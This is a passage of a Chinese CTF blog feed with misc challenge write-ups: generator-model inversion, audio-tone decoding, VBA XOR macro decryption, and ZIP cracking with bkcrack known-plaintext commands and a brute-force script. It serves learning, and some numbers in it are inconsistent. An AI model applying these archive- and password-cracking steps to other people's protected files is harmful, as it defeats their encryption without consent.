cv2<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JBN</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(JBN, self).__init__()<br>        self.main = nn.Sequential(<br>            nn.Linear(<span class="hljs-number">100</span>, <span class="hljs-number">256</span>),<br>            nn.ReLU(),<br>            nn.Linear(<span class="hljs-number">256</span>, <span class="hljs-number">512</span>),<br>            nn.ReLU(),<br>            nn.Linear(<span class="hljs-number">512</span>, <span class="hljs-number">452</span> * <span class="hljs-number">280</span>),<br>            nn.Tanh()<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        img = self.main(x)<br>        img = img.view(-<span class="hljs-number">1</span>, <span class="hljs-number">452</span>, <span class="hljs-number">280</span>)<br>        <span class="hljs-keyword">return</span> img<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">watch_flag</span>(<span class="hljs-params">img</span>):<br>    flag = cv2.imread(<span class="hljs-string">&#x27;./data/data/flag.png&#x27;</span>)<br>    gray_image = cv2.cvtColor(flag, cv2.COLOR_BGR2GRAY)<br>    flag_tensor = torch.from_numpy(np.array(gray_image))<br>    flag_tensor = flag_tensor.unsqueeze(<span class="hljs-number">0</span>).transpose(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>    img_tensor = img<br>    flag_tensor = flag_tensor.unsqueeze(<span class="hljs-number">0</span>)<br>    img_tensor = img_tensor.unsqueeze(<span class="hljs-number">0</span>)<br>    loss_fn = torch.nn.MSELoss()<br>    loss = loss_fn(flag_tensor.<span class="hljs-built_in">float</span>(), img_tensor)<br>    <span class="hljs-keyword">return</span> loss<br><br><br>jbn = JBN()<br>g_optimizer = torch.optim.Adam(jbn.parameters(), lr=<span class="hljs-number">0.001</span>)<br>min_loss = <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)<br><br><span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    random_noise = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)<br>    jbn_img = jbn(random_noise)<br>    g_optimizer.zero_grad()<br>    g_loss = watch_flag(jbn_img)<br>    g_loss.backward()<br>    g_optimizer.step()<br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">if</span> g_loss &lt; min_loss:<br>            min_loss = g_loss<br>            torch.save(jbn.state_dict(), <span class="hljs-string">&#x27;jbn.pth&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>题目的意思很明确，根据源码和jbn.pth反向生成flag</p><p>chatgpt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> cv2<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JBN</span>(nn.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(JBN, self).__init__()<br>        self.main = nn.Sequential(<br>            nn.Linear(<span class="hljs-number">100</span>, <span class="hljs-number">256</span>),<br>            nn.ReLU(),<br>            nn.Linear(<span class="hljs-number">256</span>, <span class="hljs-number">512</span>),<br>            nn.ReLU(),<br>            nn.Linear(<span class="hljs-number">512</span>, <span class="hljs-number">452</span> * <span class="hljs-number">280</span>),<br>            nn.Tanh()<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        img = self.main(x)<br>        img = img.view(-<span class="hljs-number">1</span>, <span class="hljs-number">452</span>, <span class="hljs-number">280</span>)<br>        <span class="hljs-keyword">return</span> img<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_flag</span>(<span class="hljs-params">jbn_model, output_path</span>):<br>    jbn = JBN()<br>    jbn.load_state_dict(torch.load(jbn_model))<br>    jbn.<span class="hljs-built_in">eval</span>()<br><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        random_noise = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)<br>        generated_img = jbn(random_noise)<br>        generated_img = generated_img.squeeze().numpy()<br>        generated_img = (generated_img + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>  <span class="hljs-comment"># 将图像像素值映射到0-1之间</span><br>        generated_img = np.clip(generated_img, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># 将像素值限制在0-1之间</span><br><br>        plt.imshow(generated_img, cmap=<span class="hljs-string">&#x27;gray&#x27;</span>)<br>        plt.axis(<span class="hljs-string">&#x27;off&#x27;</span>)<br>        plt.savefig(output_path, bbox_inches=<span class="hljs-string">&#x27;tight&#x27;</span>, pad_inches=<span class="hljs-number">0</span>)  <span class="hljs-comment"># 保存生成的图像</span><br>        plt.show()<br><br><br>generate_flag(<span class="hljs-string">&#x27;jbn.pth&#x27;</span>, <span class="hljs-string">&#x27;generated_flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1697858621475.png" alt="1697858621475"></p><h2 id="justlisten"><a href="#justlisten" class="headerlink" title="justlisten"></a>justlisten</h2><p>扫描汉信码hint.png，得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">length</span>:<span class="hljs-number">189</span><br><span class="hljs-attribute">0urS3cret</span><br></code></pre></td></tr></table></figure><p>010打开this is our secret.bmp</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698146949289.png" alt="1698146949289"></p><p>9e97ba2a是oursecret的特征</p><p>使用oursecret对bmp文件进行提取，密码是0urS3cret</p><p>提取出一个haha.txt</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&#125;&#123;-<span class="hljs-string">?!</span><br></code></pre></td></tr></table></figure><p>应该是一个字典</p><p>用Audacity查看嘘.wav文件，看它的频谱图，得知它的频率为[800,900,1000,1100,1200,1300,1400,1500,1700,1800]以及它的每个频率变化的时间为0.1s，同时可以得知它的采样频率为44100</p><p>脚本读取wav文件的数据长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> wave<br><span class="hljs-keyword">import</span> scipy.fftpack <span class="hljs-keyword">as</span> fftpack<br><br>SAMPLE_RATE = <span class="hljs-number">44100</span>                                     <br>SAMPLE_TIME = <span class="hljs-number">0.1</span>                                       <br>SAMPLE_NUM = <span class="hljs-built_in">int</span>(SAMPLE_RATE * SAMPLE_TIME)            <span class="hljs-comment">#4410 </span><br>LIST = [<span class="hljs-number">800</span>, <span class="hljs-number">900</span>, <span class="hljs-number">1000</span>, <span class="hljs-number">1100</span>, <span class="hljs-number">1200</span>, <span class="hljs-number">1300</span>, <span class="hljs-number">1400</span>, <span class="hljs-number">1500</span>, <span class="hljs-number">1600</span>, <span class="hljs-number">1700</span>]<br><br><span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;嘘.wav&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:          <span class="hljs-comment">#读取为数组</span><br>    wav_data = np.frombuffer(f.readframes(-<span class="hljs-number">1</span>), dtype=np.int16)<br>    N = <span class="hljs-built_in">len</span>(wav_data)                                   <span class="hljs-comment">#获取数据长度</span><br><br>    <span class="hljs-built_in">print</span> (N)   <span class="hljs-comment">#1666980</span><br><br>a = (N/(<span class="hljs-number">44100</span>*<span class="hljs-number">0.1</span>))/<span class="hljs-number">189</span><br><span class="hljs-built_in">print</span>(a) <span class="hljs-comment">#2.0</span><br></code></pre></td></tr></table></figure><p>可以得知数据长度N&#x3D;1666980，然后再a &#x3D; (N&#x2F;(44100*0.1))&#x2F;42来计算每个字符占了多少时长为0.2s</p><p>处理一下数字信号，并根据分离出的字典来获取隐藏的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> wave<br><span class="hljs-keyword">import</span> scipy.fftpack <span class="hljs-keyword">as</span> fftpack<br><br>SAMPLE_RATE = <span class="hljs-number">44100</span>                                     <br>SAMPLE_TIME = <span class="hljs-number">0.1</span>                                       <br>SAMPLE_NUM = <span class="hljs-built_in">int</span>(SAMPLE_RATE * SAMPLE_TIME)            <span class="hljs-comment">#4410 </span><br>LIST = [<span class="hljs-number">800</span>, <span class="hljs-number">900</span>, <span class="hljs-number">1000</span>, <span class="hljs-number">1100</span>, <span class="hljs-number">1200</span>, <span class="hljs-number">1300</span>, <span class="hljs-number">1400</span>, <span class="hljs-number">1500</span>, <span class="hljs-number">1600</span>, <span class="hljs-number">1700</span>]   <br><br><br><span class="hljs-comment"># 傅里叶变换</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fft</span>(<span class="hljs-params">data</span>):<br>    N = <span class="hljs-built_in">len</span>(data)                                   <span class="hljs-comment">#获取数据长度</span><br>    fft_data = fftpack.fft(data)                    <span class="hljs-comment">#得到频域信号                      </span><br>    abs_fft = np.<span class="hljs-built_in">abs</span>(fft_data)                      <span class="hljs-comment">#计算幅值    </span><br>    abs_fft = abs_fft/(N/<span class="hljs-number">2</span>)                             <br>    half_fft = abs_fft[<span class="hljs-built_in">range</span>(N//<span class="hljs-number">2</span>)]                 <span class="hljs-comment">#取频域信号的前半部分</span><br><br>    <span class="hljs-keyword">return</span> half_fft<br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec_100ms</span>(<span class="hljs-params">wave_data_100_ms</span>):                     <span class="hljs-comment">#解码100毫秒的音频数据</span><br>    fft_ret = fft(wave_data_100_ms)<br>    <span class="hljs-keyword">for</span> index, freq <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(LIST):<br>        <span class="hljs-keyword">if</span> np.<span class="hljs-built_in">max</span>(fft_ret[<span class="hljs-built_in">int</span>(freq*SAMPLE_TIME) - <span class="hljs-number">2</span> : <span class="hljs-built_in">int</span>(freq*SAMPLE_TIME) + <span class="hljs-number">2</span>]) &gt; <span class="hljs-number">0.8</span>:<br>            <span class="hljs-built_in">print</span>(freq, <span class="hljs-string">&#x27;Hz有值&#x27;</span>)<br>            <span class="hljs-keyword">return</span> index<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dec_sentence</span>(<span class="hljs-params">wav_data</span>):                          <span class="hljs-comment">#解码整个句子</span><br>    _100ms_count = <span class="hljs-built_in">len</span>(wav_data) // SAMPLE_NUM          <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;待解码音频包含&#x27;</span>, _100ms_count // <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;个字&#x27;</span>)    <br><br>    ret = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, _100ms_count, <span class="hljs-number">2</span>):                <br>        index = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>            index = index*<span class="hljs-number">10</span> + dec_100ms(wav_data[i*SAMPLE_NUM + k*SAMPLE_NUM : i*SAMPLE_NUM + (k+<span class="hljs-number">1</span>)*SAMPLE_NUM])<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;序号：&#x27;</span>, index)<br>        ret += string[index]<br><br>    <span class="hljs-keyword">return</span> ret<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;haha.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        string =  f.read()<br><br>    <span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;嘘.wav&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:          <span class="hljs-comment">#读取为数组</span><br>        wav_data = np.frombuffer(f.readframes(-<span class="hljs-number">1</span>), dtype=np.int16)<br><br>    <span class="hljs-built_in">print</span>(dec_sentence(wav_data))<br></code></pre></td></tr></table></figure><p>运行得到flag</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698147763017.png" alt="1698147763017"></p><h2 id="NoPasswd"><a href="#NoPasswd" class="headerlink" title="NoPasswd"></a>NoPasswd</h2><p>打开doc文件发现加密</p><p>查看属性发现宏孩儿和60290f0225011a72697f420d1f4e402778231b</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/image-20231025162148326.png" alt="image-20231025162148326"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">oleid：分析OLE文件以检测通常在恶意文件中发现的特定特征。<br>olevba：从<span class="hljs-keyword">MS</span> <span class="hljs-title">Office</span>文档（OLE和OpenXML）中提取和分析VBA Macro源代码。<br>MacroRaptor：检测恶意的VBA宏<br>msodde：检测并从<span class="hljs-keyword">MS</span> <span class="hljs-title">Office</span>文档，RTF和CSV中提取DDE / DDEAUTO链接<br>pyxswf：检测，提取和分析可能嵌入在<span class="hljs-keyword">MS</span> <span class="hljs-title">Office</span>文档（例如Word，Excel）和RTF等文件中的Flash对象（SWF），这对于恶意软件分析特别有用。<br>oleobj：从OLE文件中提取嵌入式对象。<br>rtfobj：从RTF文件中提取嵌入式对象。<br></code></pre></td></tr></table></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">Sub</span> XOREncryptFile()<br>    <span class="hljs-keyword">Dim</span> numbers(<span class="hljs-number">8</span>) <span class="hljs-keyword">As</span> <span class="hljs-type">Integer</span><br><br>    numbers(<span class="hljs-number">0</span>) = <span class="hljs-number">19</span><br>    numbers(<span class="hljs-number">1</span>) = <span class="hljs-number">71</span><br>    numbers(<span class="hljs-number">2</span>) = <span class="hljs-number">122</span><br>    numbers(<span class="hljs-number">3</span>) = <span class="hljs-number">99</span><br>    numbers(<span class="hljs-number">4</span>) = <span class="hljs-number">65</span><br>    numbers(<span class="hljs-number">5</span>) = <span class="hljs-number">111</span><br>    numbers(<span class="hljs-number">6</span>) = <span class="hljs-number">43</span><br>    numbers(<span class="hljs-number">7</span>) = <span class="hljs-number">67</span><br><br><br>    <span class="hljs-keyword">Dim</span> CurrentDirectory <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>    CurrentDirectory = <span class="hljs-string">&quot;.\&quot;</span><br><br>    <span class="hljs-keyword">If</span> Dir(CurrentDirectory &amp; <span class="hljs-string">&quot;abc&quot;</span>) = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">Then</span><br>        <span class="hljs-keyword">Exit</span> <span class="hljs-keyword">Sub</span><br>    <span class="hljs-keyword">End</span> <span class="hljs-keyword">If</span><br><br>    <span class="hljs-keyword">Dim</span> FileNumber <span class="hljs-keyword">As</span> <span class="hljs-type">Integer</span><br>    FileNumber = FreeFile<br>    Open CurrentDirectory &amp; <span class="hljs-string">&quot;abc&quot;</span> <span class="hljs-keyword">For</span> <span class="hljs-keyword">Binary</span> Access Read Write <span class="hljs-keyword">As</span> #FileNumber<br><br>    <span class="hljs-keyword">Dim</span> FileContent <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br>    FileContent = Input$(LOF(FileNumber), #FileNumber)<br><br>    Close #FileNumber<br><br>    <span class="hljs-keyword">Dim</span> EncryptedContent <span class="hljs-keyword">As</span> <span class="hljs-type">String</span><br><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> Len(FileContent)<br>        EncryptedContent = EncryptedContent &amp; Chr(Asc(<span class="hljs-keyword">Mid</span>(FileContent, i, <span class="hljs-number">1</span>)) <span class="hljs-built_in">Xor</span> numbers((i - <span class="hljs-number">1</span>) <span class="hljs-built_in">Mod</span> <span class="hljs-number">8</span>))<br>    <span class="hljs-keyword">Next</span> i<br><br>    FileNumber = FreeFile<br>    Open CurrentDirectory &amp; <span class="hljs-string">&quot;enc&quot;</span> <span class="hljs-keyword">For</span> <span class="hljs-keyword">Binary</span> Access Write <span class="hljs-keyword">As</span> #FileNumber<br><br>    Put #FileNumber, , EncryptedContent<br><br>    Close #FileNumber<br><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure><p>分析一下可以知道就是简单的异或，enc应该就是备注中的16进制字符串，写个脚本解密一下可以得到doc的密码，解开doc可以发现base64字符串，解码一下可知是zip文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>enc = long_to_bytes(<span class="hljs-number">0x60290f0225011a72697f420d1f4e402778231b</span>)<br>key = [<span class="hljs-number">19</span>,<span class="hljs-number">71</span>,<span class="hljs-number">122</span>,<span class="hljs-number">99</span>,<span class="hljs-number">65</span>,<span class="hljs-number">111</span>,<span class="hljs-number">43</span>,<span class="hljs-number">67</span>]<br><br>abc = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    abc += <span class="hljs-built_in">chr</span>(enc[i] ^ key[i%<span class="hljs-number">8</span>])<br><br><span class="hljs-built_in">print</span>(abc)<br></code></pre></td></tr></table></figure><p>解密得到一堆文字，可能是base64，cyberchef解密发现是zip，导出压缩包发现是伪加密</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698223285560.png" alt="1698223285560"></p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698223316727.png" alt="1698223316727"></p><p>解压缩发现报png文件格式错误，说明压缩包里的是png，我们看看变量的数据</p><p>发现文件名应该是flag.png一共8个字节，但是变量那边的name长度只有4个字节，所以我们要改成8个字节</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698223501672.png" alt="1698223501672"></p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/flag.png" alt="flag"></p><h2 id="SecretZip"><a href="#SecretZip" class="headerlink" title="SecretZip"></a>SecretZip</h2><p>题目给了一个key文件，以及一个加密的zip，key文件内其实是压缩包明文压缩后的前半部分，因此压缩包虽然不是store的压缩模式，也能进行已知部分明文攻击</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">bkcrack -C purezip<span class="hljs-selector-class">.zip</span> -c <span class="hljs-string">&#x27;secret key.zip&#x27;</span> -<span class="hljs-selector-tag">p</span> key<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698224924831.png" alt="1698224924831"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">e63af7cc</span> <span class="hljs-number">55</span>ef839d dc10b922<br></code></pre></td></tr></table></figure><p>解密的数据可能会被压缩，具体取决于创建 zip 文件时是否使用压缩。如果使用 deflate 压缩，则<code>tools</code>可以使用文件夹中提供的 Python 3 脚本来解压缩数据。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bkcrack</span> -C purezip.zip -c &#x27;secret key.zip&#x27; -k e63af7cc <span class="hljs-number">55</span>ef839d dc10b922  -d <span class="hljs-number">01</span>_deflate<br><span class="hljs-attribute">python3</span> inflate.py &lt; <span class="hljs-number">01</span>_deflate &gt; <span class="hljs-number">01</span>.zip<br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698245516530.png" alt="1698245516530"></p><p>01.zip在010查看发现提示密码是2字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> trange<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> trange(<span class="hljs-number">256</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        fz = zipfile.ZipFile(<span class="hljs-string">&#x27;01.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>        password = libnum.n2s(i) + libnum.n2s(j)<br>        <span class="hljs-keyword">try</span>:<br>            fz.extractall(pwd=password)<br>            <span class="hljs-built_in">print</span>(password)<br>            fz.close()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:<br>            fz.close()<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698245671552.png" alt="1698245671552"></p><p>解压出一个secret key.txt，里面内容<code>e48d3828 5b7223cc 71851fb0</code></p><p>同时在zpaq文件的文件尾得到提示the password is md5(the plaintext of the secret key which length is 3 bytes)</p><p>因此要还原pkzip的三段秘钥，但是发现bkcrack自带了秘钥还原的接口</p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698247609404.png" alt="1698247609404"></p><p><img src="/2023/10/23/DASCTF_X_CBCTF2023__%E6%97%A0%E7%95%8F%E8%80%85%E5%85%88%E8%A1%8C/1698247531170.png" alt="1698247531170"></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">bb9cceb294113270da5eaed<span class="hljs-number">47a545f55</span><br></code></pre></td></tr></table></figure><p>解压得到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF2023</title>
    <link href="/2023/10/23/NewStarCTF2023/"/>
    <url>/2023/10/23/NewStarCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h3><p>附件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 